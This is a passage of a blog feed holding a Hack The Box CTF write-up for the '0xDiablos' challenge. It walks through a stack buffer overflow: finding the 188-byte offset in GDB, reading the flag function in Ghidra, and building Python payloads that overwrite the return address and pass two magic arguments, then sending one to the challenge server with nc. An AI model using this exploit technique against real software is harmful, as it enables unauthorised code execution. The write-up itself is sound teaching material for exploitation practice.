-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b&apos;A&apos;*186 + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload.bin
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now, with GDB, we can analyze if the offset is correct:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r &amp;lt; payload.bin
-Starting program: /tmp/htb/vuln &amp;lt; payload.bin
-Downloading separate debug info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;system-supplied DSO at 0xf7fc7000                  
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Thread debugging using libthread_db enabled]                                          
-Using host libthread_db library &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/libthread_db.so.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
-
-Program received signal SIGSEGV, Segmentation fault.
-0x08000804 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Note that the program crashed at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08000804&lt;/code&gt;. This suggests that the return address might not have been overwritten with the correct address; that is, our offset is wrong. With an offset of 187, we get the same, but now in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00080491&lt;/code&gt; address. As we can see, slowly our payload is being overwritten in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$eip&lt;/code&gt; register. With 188 we get a segmentation fault at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;, and with 189 we get it at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x91e24141&lt;/code&gt;. This indicates the correct offset is 188, since the crash at 0xdeadbeef with this offset confirms that the exact location of the return address on the stack is being targeted. The return address is overwritten with the bytes from our payload and calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function.&lt;/p&gt;
-
-&lt;p&gt;Also, this is what we get when we pass the payload to the executable with an offset of 188:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b&apos;A&apos;*188 + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos;)&quot;&lt;/span&gt; | ./vuln
-You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
-Hurry up and try &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;on server side.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Hurry up and try in on server side.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;This seems a message that is being displayed at the flag function. Let’s check it with GDB:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; b flag
-Breakpoint 1 at 0x80491e6
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r &amp;lt; payload.bin
-Starting program: /tmp/htb/vuln &amp;lt; payload.bin
-Downloading separate debug info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;system-supplied DSO at 0xf7fc7000                  
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Thread debugging using libthread_db enabled]                                          
-Using host libthread_db library &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/libthread_db.so.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
-
-Breakpoint 1, 0x080491e6 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;flag &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Aha! As expected, we are reaching the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function now! It is just a matter of adjusting our payload now to successfully printing the contents of the file openned with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt;. Let’s use GDB to investigate the flow of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
-0x08049205 &amp;lt;+35&amp;gt;:    call   0x80490b0 &amp;lt;fopen@plt&amp;gt;
-0x0804920a &amp;lt;+40&amp;gt;:    add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
-0x0804920d &amp;lt;+43&amp;gt;:    mov    %eax,-0xc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0x08049210 &amp;lt;+46&amp;gt;:    cmpl   &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,-0xc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0x08049214 &amp;lt;+50&amp;gt;:    jne    0x8049232 &amp;lt;flag+80&amp;gt;
-0x08049216 &amp;lt;+52&amp;gt;:    sub    &lt;span class=&quot;nv&quot;&gt;$0xc&lt;/span&gt;,%esp
-0x08049219 &amp;lt;+55&amp;gt;:    lea    &lt;span class=&quot;nt&quot;&gt;-0x1fec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
-0x0804921f &amp;lt;+61&amp;gt;:    push   %eax
-0x08049220 &amp;lt;+62&amp;gt;:    call   0x8049070 &amp;lt;puts@plt&amp;gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Note that we are comparing the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%ebp&lt;/code&gt; stack with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0&lt;/code&gt;, which is C equivalent to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;. If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmpl&lt;/code&gt; returns true, we do not jump with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jne&lt;/code&gt; and we get the message “Hurry up and try in on server side.” through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts@plt&lt;/code&gt; function. This happens because there is no text file to be openned in our local machine.&lt;/p&gt;
-
-&lt;p&gt;Without knowing the name of the file openned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt;, we cannot go further with our analysis locally. One way to enhance our analysis is by using Ghidra. Ghidra is a reverse engineering software that a lot of times rewrites the original code to us from the assembly.&lt;/p&gt;
-
-&lt;p&gt;After running Ghidra, we find the following:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/ghidra-fopen.png&quot; alt=&quot;ghidra&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We see that the file name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;. Alright! We can create a flag ourselves and keep testing it locally. Just run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;hi mom&quot; &amp;gt; flag.txt&lt;/code&gt; and go back to GDB!&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r &amp;lt; payload.bin 
-Starting program: /tmp/htb/vuln &amp;lt; payload.bin
-Downloading separate debug info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;system-supplied DSO at 0xf7fc7000                  
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Thread debugging using libthread_db enabled]                                          
-Using host libthread_db library &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/libthread_db.so.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
-
-Program received signal SIGSEGV, Segmentation fault.
-0xffffff00 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Note that now we are not getting the message. This is because the program is successfully openning the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; file and reading its contents. The problem is: it is not printing it for us!&lt;/p&gt;
-
-&lt;p&gt;Looking back at Ghidra, we see this line:&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[...&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;snip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...]&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21524111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3f212ff3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;[...&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;snip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...]&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;which is similar to the line we analyzed with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt;, where it compares the values of two registers with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$0xc0ded00d&lt;/code&gt;. To trigger this if statement, we need to concatenate these addresses in our payload. Hopefully, this solves the challenge!&lt;/p&gt;
-
-&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;
-&lt;p&gt;Let’s test our new payload locally:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b&apos;A&apos;*188 + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos; + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload2.bin&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payload2.bin | ./vulnYou know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�ﾭ�
-Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Note that it did not work correctly. This is because we need to pass the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;param1&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;param2&lt;/code&gt; as function parameters. In order to pass them as a parameter, we need to populate the EIP register with an address. This address can essentially be anything, but its size in bytes matter. The final payload would then be:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb :&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b&apos;A&apos;*188 + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos; + b&apos;mula&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload2.bin
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payload2.bin | ./vuln
-You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�mulaﾭ�
-hi mom
-Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As we can see, we now print the value of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;. This adjustment was made such that it would align the stack for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function to understand our paramters.&lt;/p&gt;
-
-&lt;p&gt;Let’s try in the server now!&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;^C&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payload2.bin - | nc 167.99.82.136 31987
-You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
-
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�mulaﾭ�
-HTB&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;redacted&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;And there is our flag!&lt;/p&gt;
-
-&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
-
-&lt;p&gt;In this CTF, we learned a lot more about reverse engineering, GDB and how to exploit a simple buffer overflow. As we can see, reverse engineering exploitation is extremely hard and troublesome, even in its simpler form.&lt;/p&gt;
-
-&lt;p&gt;I hope you learned something knew today, and as always, never forget to do your &lt;strong&gt;research&lt;/strong&gt;!&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Sat, 30 Dec 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000//0xdiablos-htb</link>
-        <link href="http://localhost:4000/0xdiablos-htb"/>
-        <guid isPermaLink="true">http://localhost:4000/0xdiablos-htb</guid>
       </item>
     
   </channel>
